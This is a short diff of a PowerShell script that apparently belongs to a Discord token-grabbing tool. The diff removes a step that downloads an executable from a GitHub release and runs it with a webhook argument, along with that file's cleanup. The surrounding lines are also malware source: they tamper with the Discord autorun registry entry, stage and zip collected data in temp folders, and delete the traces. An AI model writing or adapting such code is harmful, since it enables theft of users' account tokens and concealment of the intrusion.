@@ -817,12 +817,8 @@ function Backup-Data {
         Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force  | Out-Null
     } catch {}
 
-    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
 
-
-    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
-    $proc.WaitForExit()
 
     $main_temp = "$env:localappdata\temp"
     $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
@@ -858,7 +854,7 @@ function Backup-Data {
 
     Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
-    Remove-Item "$main_temp\main.exe" -Force
+
 }
 
 function Invoke-TASKS {
